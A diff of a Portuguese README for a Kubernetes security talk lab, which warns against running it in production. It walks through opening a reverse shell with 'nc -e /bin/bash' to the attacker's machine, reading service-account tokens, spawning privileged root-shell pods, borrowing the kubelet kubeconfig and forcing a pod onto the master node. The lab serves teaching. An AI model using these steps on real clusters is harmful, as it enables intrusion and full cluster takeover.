@@ -1,10 +1,12 @@
-# Lab da talk Kubernetes é seguro por default ou à prova de má configuração?
+# Kubernetes é seguro por default ou à prova de má configuração?
 
-Para nosso lab vamos precisar de um cluster kubernetes, pode ser minikube ou kind
+# Lab + explicação:
 
-**Não executar em seu cluster produtivo** 
+Para nosso montar nosso lab vamos precisar de um cluster kubernetes, pode ser minikube ou kind.
 
-Primeiro vamos criar nosso namespace, service account e roles:
+**Não executar esse lab em um cluster produtivo** 
+
+Primeiro vamos criar nosso namespace, pod, service account e roles:
 
 ```
 kubectl create ns production
@@ -36,7 +38,7 @@ sudo nc  -l 32000
 
 Executar no terminal remoto para ganhar acesso a shell:
 ```
-nc -e /bin/bash 192.168.1.172 32000
+nc -e /bin/bash "IP da sua maquina" 32000
 ```
 
 Primeiro identificarmos com qual usuário estamos logados:
@@ -77,6 +79,7 @@ cd /tmp; curl -fSL "https://github.com/genuinetools/amicontained/releases/downlo
 
 Todo pod, deploy e rs possui uma serviceaccount e por padrão são executados com a conta default. Uma serviceaccount fornece uma identidade para processos executados em um pod e nela são atrelado as rules de permissão.
 As chaves e certificados ficam em um volume montado no pod.
+
 ```
 cd /var/run/secrets/kubernetes.io/serviceaccount
 ```
@@ -103,7 +106,6 @@ Listaremos os pods com o kubectl.
 ```
 ./kubectl get pod
 ```
-
 Para testar nossos acessos vamos utilizar o "kubectl auth can-i"
 ```
 ./kubectl auth can-i --list
@@ -145,7 +147,9 @@ sleep 10
 ./kubectl exec -it root-shell -- bash
 
 ```
-Conseguimos nosso acesso agora vamos ver o que conseguimos:
+Conseguimos acesso uma máquina !  
+
+Verificando os acessos: 
 
 ```
 id
@@ -155,22 +159,34 @@ ps aux
 docker ps
 
 cat /etc/hostname
-```
 
-Agora vamos pegar a conta de serviço para listar os nodes:
+```
+Nosso acesso é a um worker mas queremos chegar nos master, para isso será necessário informações sobre os demais nodes.
+
+Como vimos nossa conta não possui permissão para listar os nodes, então vamos procurar um conta que consiga listar os nodes.
+Lembrando dos componentes que fazem parte do node o kubelet possui permissão para verificar os nós ativos, vamos tentar utilizar sua configuração de autenticação para listarmos os nodes:
+
+Vamos pegar suas config com:
 
 ```
 systemctl status kubelet
 ```
-Agora vamos lista-los
+
+Com a config do kubelet tentaremos listar os nodes usando o parametro --kubeconfig:
+
 ```
 kubectl get no --kubeconfig=/etc/kubernetes/kubelet.conf
 ```
-Vamos voltar para nosso container:
+
+Conseguimos ! 
+
+Agora vamos forçar o scheduler nos agendar no node master.
+Mas primeiro precisamos voltar para nosso container com permissão de criação de pods.
+
 ```
 exit
 ```
-Agora vamos forçar o sheduler nos agendar no nó master
+
 - **Nome do node Master** | Substituir pelo nome do seu nó em yml abaixo.
 
 ```
@@ -209,7 +225,7 @@ sleep 10
 ./kubectl exec -it master-root-shell -- bash
 ```
 
-Pronto conseguimos nosso acesso ao master
+Conseguimos acesso ao master =)
 ```
 id
 
